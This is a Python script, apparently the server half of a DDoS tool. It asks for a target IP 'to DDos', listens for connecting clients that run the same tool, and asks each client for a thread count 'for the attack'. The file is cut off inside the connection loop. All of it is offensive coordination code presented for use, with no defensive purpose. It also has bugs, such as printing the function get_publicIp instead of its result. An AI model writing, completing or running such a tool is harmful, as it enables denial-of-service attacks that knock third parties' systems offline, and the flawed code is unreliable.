import socket
import requests
import time
import ipaddress
import json

def logit(addr,threadCount):
    with open("output/log.txt",'+a') as f :
        content = f"[{time.ctime()}] :: connection from {addr} with {threadCount} threads"
        f.write(content)
        
def get_publicIp():
    endpoint = 'https://ipinfo.io/json'
    response = requests.get(endpoint, verify = True)

    if response.status_code != 200:
        return 'Status:', response.status_code, 'Problem with the request. Exiting.'
        exit()

    data = response.json()

    return data['ip']

s = socket.socket()
port = int(input("Enter the port no to host a Server : "))
Target = input("Enter the Ip to DDos : ")

try :
    ipaddress.ip_address(Target)
except ValueError:
    print("Invalid ip !!!")
    exit()
    
s.bind(('',port))
s.listen(30)     
print (f"socket is listening at {get_publicIp}")         
print("connect the server using the same tool and commands will be Given there !!!")


while True:
    c,addr   = s.accept()
    print(f"Got connection form {addr}!!")
    c.send("Enter the Thread Count For the attack 5-30 [default=10]: ".encode())
    thread = c.recv(1024).decode()
    
    
    